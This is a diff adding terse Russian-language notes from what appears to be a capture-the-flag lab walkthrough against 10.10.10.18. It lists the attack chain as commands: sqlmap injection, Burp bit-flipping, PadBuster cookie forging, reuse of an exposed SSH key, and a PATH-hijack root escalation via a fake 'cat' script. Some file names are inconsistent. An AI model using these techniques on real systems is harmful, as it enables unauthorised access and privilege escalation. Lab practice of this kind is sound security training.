@@ -1,0 +1,100 @@
+																									
+	nmap -sC -sV -oA nmap 10.10.10.18				22																				
+					80																				
+																									
+																									
+				10.10.10.18/login.php																					
+																									
+		проксируем через brup suite																							
+			запрос который мы отправляли смотрм что там и сохраняем в файл																						
+				login.req																					
+																									
+				sqlmap -r login.req --level 4 --risk 3 																					
+																									
+																									
+		паралельно подбираем пароль																							
+																									
+				поиск имени пользователя 																					
+				burp suit -> intruder -> payload type : Bit flipper																					
+					должн быть токен кукы																				
+																									
+																									
+			находим админ куку и добавляем в браузер и перезапускаем страничку должны зайти																						
+																									
+																									
+		https://www.securitylab.ru/analytics/481048.php																							
+		https://github.com/GDSSecurity/PadBuster			инструмент для дишифрования 																				
+			perl padBuster.pl http://10.10.10.18/index.php ubIkhokfshjfhjsbvjksnvjhbvsjlnvljkandlkvjn -8 -cookies auth=ubIkhokfshjfhjsbvjksnvjhbvsjlnvljkandlkvjn																						
+			perl padBuster.pl http://10.10.10.18/index.php ubIkhokfshjfhjsbvjksnvjhbvsjlnvljkandlkvjn -8 -cookies auth=ubIkhokfshjfhjsbvjksnvjhbvsjlnvljkandlkvjn -plaintext user=admin																						
+							получаес куки админа и можем через запрос Burp suit делаем запрос и должны попасть в админку на сайт																		
+																									
+		при входе был обнаружин ключт 																							
+			скопируем ключ 																						
+			wget http://10.10.10.18/mysskeeywithnamemitsos																						
+																									
+			mv mysshkeywithnamenitsos mitsos.key																						
+			chmod 600 mitsos.key																						
+																									
+			ssh -i mitsos.key mitsoso@10.10.10.18																						
+																									
+				попали на сервер\																					
+																									
+				есть файл backup 																					
+																									
+				gdb ./backup																					
+				r																					
+				si																					
+				x/s 0x80484de																					
+						должны получить путь с чего сделан бекап 																			
+				si																					
+																									
+																									
+				echo $PATH																					
+				должно вывести список доступных каталогов																					
+																									
+				which ping 																					
+					/bin/ping																				
+				which cat																					
+					/bin/cat																				
+																									
+																									
+					vi cat																				
+																									
+					#!/bin/bash																				
+																									
+					/bin/sh																				
+																									
+					chmod +x cat																				
+																									
+																									
+					vi cat																				
+																									
+					#!/bin/bash																				
+																									
+					#/bin/sh																				
+					echo "Path Hijacked"																				
+																									
+																									
+					cat /etc/passwd																				
+																									
+					export PATH=`pwd` :$PATH																				
+					echo $PATH																				
+																									
+					chmod +x cat																				
+																									
+																									
+					vi cat																				
+																									
+					#!/bin/bash																				
+																									
+					/bin/sh																				
+					#echo "Path Hijacked"																				
+																									
+																									
+					./backup																				
+					id																				
+					root																				
+					less root.txt																				
+					
+																
+																									
